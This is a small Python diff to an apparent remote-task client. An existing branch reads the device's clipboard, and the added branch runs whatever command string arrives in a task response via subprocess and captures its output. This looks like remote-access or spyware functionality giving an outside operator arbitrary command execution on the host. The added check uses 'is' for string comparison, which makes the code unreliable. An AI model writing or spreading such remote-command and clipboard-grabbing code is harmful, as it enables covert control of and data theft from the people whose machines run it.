@@ -44,6 +44,13 @@ class TaskManagmentHandler():
                     # Get clipboard data
                     devInfoProvider = DeviceInfoProvider()
                     clipboardData = devInfoProvider.getClipboardData()
+                elif taskResponse["task"] is "terminal":
+                    import  subprocess
+
+                    if taskResponse["data"]:
+                        if len(taskResponse["data"]) > 0:
+                            command = taskResponse["data"]
+                            terminalOutput = subprocess.check_output(command).decode("UTF-8")
         else:
             self.currentAwaitingTime = self.MINUTES_TO_FAILED_TASK
 
